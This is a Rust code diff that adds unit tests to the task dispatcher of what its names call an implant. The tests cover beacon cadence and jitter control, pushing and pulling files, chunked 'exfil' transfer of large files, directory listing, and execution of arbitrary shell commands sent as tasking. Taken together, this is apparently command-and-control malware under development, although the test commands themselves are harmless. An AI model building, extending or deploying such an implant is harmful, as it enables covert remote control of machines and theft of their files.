@@ -67,7 +67,7 @@ pub struct HandlerOutput {
     pub chunks: Vec<ExfilChunk>,
 }
 
-#[derive(Clone, Copy, PartialEq)]
+#[derive(Clone, Copy, PartialEq, Debug)]
 pub enum Outcome {
     Succeeded,
     Failed,
@@ -319,4 +319,132 @@ fn unix_proc_kill(arguments: &str) -> HandlerOutput {
 #[cfg(not(windows))]
 fn errno() -> i32 {
     std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn cadence() -> Cadence {
+        Arc::new(Mutex::new((30.0, 5.0)))
+    }
+
+    /// A per-test scratch directory under the system temp dir, removed on
+    /// entry so reruns start clean.
+    fn scratch(name: &str) -> std::path::PathBuf {
+        let dir =
+            std::env::temp_dir().join(format!("rod-implant-tests-{name}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("scratch dir");
+        dir
+    }
+
+    #[test]
+    fn unknown_verbs_fail_with_the_grammar_named() {
+        let out = dispatch("no.such.verb", "args", &cadence());
+        assert_eq!(out.outcome, Outcome::Failed);
+        assert!(out.output.contains("no.such.verb"), "{}", out.output);
+        assert!(out.chunks.is_empty());
+    }
+
+    #[test]
+    fn beacon_sleep_retunes_the_live_cadence() {
+        let cadence = cadence();
+        let out = dispatch("beacon.sleep", "10s 1", &cadence);
+        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
+        assert_eq!(*cadence.lock().unwrap(), (10.0, 1.0));
+        // A missing jitter keeps the live one.
+        dispatch("beacon.sleep", "20", &cadence);
+        assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
+        // Malformed tasking changes nothing.
+        let bad = dispatch("beacon.sleep", "1 2 3", &cadence);
+        assert_eq!(bad.outcome, Outcome::Failed);
+        assert_eq!(*cadence.lock().unwrap(), (20.0, 1.0));
+    }
+
+    #[test]
+    fn file_push_and_pull_round_trip() {
+        let dir = scratch("transfer");
+        let path = dir.join("note.txt");
+        let payload = base64::engine::general_purpose::STANDARD.encode(b"rod unit");
+        let push = dispatch(
+            "file.push",
+            &format!("{} {}", path.display(), payload),
+            &cadence(),
+        );
+        assert_eq!(push.outcome, Outcome::Succeeded, "{}", push.output);
+        let pull = dispatch("file.pull", path.to_str().unwrap(), &cadence());
+        assert_eq!(pull.outcome, Outcome::Succeeded, "{}", pull.output);
+        assert_eq!(pull.output, "rod unit");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn oversized_pulls_ride_terminal_chunk_streams() {
+        let dir = scratch("chunked");
+        let path = dir.join("blob.bin");
+        // One byte past the inline cap: the chunked path, in two full
+        // chunks plus a one-byte terminal.
+        std::fs::write(&path, vec![0u8; MAX_INLINE_BYTES + 1]).expect("blob");
+        let out = dispatch("file.pull", path.to_str().unwrap(), &cadence());
+        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
+        assert_eq!(out.chunks.len(), 3);
+        assert_eq!(out.chunks[0].data.len(), CHUNK_BYTES);
+        assert!(!out.chunks[0].terminal);
+        assert_eq!(out.chunks[1].data.len(), CHUNK_BYTES);
+        assert!(!out.chunks[1].terminal);
+        assert!(out.chunks[2].terminal);
+        assert_eq!(out.chunks[2].data.len(), 1);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn file_push_refuses_malformed_tasking() {
+        let cadence = cadence();
+        for arguments in ["", "   ", "no-space-no-payload"] {
+            let out = dispatch("file.push", arguments, &cadence);
+            assert_eq!(out.outcome, Outcome::Failed, "{arguments}");
+        }
+        let out = dispatch(
+            "file.push",
+            "certainly/not/a/path !!!not-base64!!!",
+            &cadence,
+        );
+        assert_eq!(out.outcome, Outcome::Failed);
+    }
+
+    #[test]
+    fn listings_report_sorted_json_lines() {
+        let dir = scratch("list");
+        std::fs::write(dir.join("b.txt"), b"1").expect("file");
+        std::fs::create_dir(dir.join("a")).expect("dir");
+        let out = dispatch("fs.list", dir.to_str().unwrap(), &cadence());
+        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
+        let names: Vec<String> = out
+            .output
+            .lines()
+            .map(|line| {
+                let entry: serde_json::Value = serde_json::from_str(line).expect("json lines");
+                entry["name"].as_str().expect("a name").to_string()
+            })
+            .collect();
+        assert_eq!(names, vec!["a".to_string(), "b.txt".to_string()]);
+    }
+
+    #[test]
+    fn shell_exec_captures_output_and_exit_codes() {
+        let banner = if cfg!(windows) {
+            "echo rod-unit"
+        } else {
+            "printf rod-unit"
+        };
+        let out = dispatch("shell.exec", banner, &cadence());
+        assert_eq!(out.outcome, Outcome::Succeeded, "{}", out.output);
+        assert_eq!(out.output.trim(), "rod-unit");
+        let failed = dispatch("shell.exec", "exit 3", &cadence());
+        assert_eq!(failed.outcome, Outcome::Failed);
+        assert!(failed.output.contains('3'), "{}", failed.output);
+        let empty = dispatch("shell.exec", "   ", &cadence());
+        assert_eq!(empty.outcome, Outcome::Failed);
+    }
 }
